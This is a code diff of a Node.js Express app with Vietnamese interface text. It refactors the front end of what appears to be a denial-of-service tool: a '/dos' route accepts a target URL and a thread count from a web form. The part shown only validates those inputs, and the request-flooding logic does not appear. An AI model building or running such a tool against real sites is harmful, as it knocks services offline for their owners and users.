@@ -1,35 +1,24 @@
 const express = require('express');
 const axios = require('axios');
 const async = require('async');
+const path = require('path');
 
 const app = express();
 app.use(express.urlencoded({ extended: true }));
+app.use(express.static(path.join(__dirname, 'public')));
 
 app.get('/', (req, res) => {
-    res.send(`
-        <html>
-        <body>
-            <form action="/dos" method="post">
-                <label for="url">Nhập URL:</label><br>
-                <input type="text" id="url" name="url" required><br>
-                <label for="threads">Số lượng threads:</label><br>
-                <input type="number" id="threads" name="threads" required min="1"><br>
-                <button type="submit">Gửi Yêu Cầu</button><br>
-            </form>
-            <div id="result"></div>
-        </body>
-        </html>
-    `);
+    res.sendFile(path.join(__dirname, 'index.html'));
 });
 
 app.post('/dos', async (req, res) => {
     const url = req.body.url;
     const threads = parseInt(req.body.threads, 10);
-    
+
     if (!url.startsWith('http')) {
         return res.send('URL không hợp lệ. Vui lòng nhập URL bắt đầu bằng http:// hoặc https://');
     }
-    
+
     if (isNaN(threads) || threads <= 0) {
         return res.send('Số lượng threads không hợp lệ!');
     }
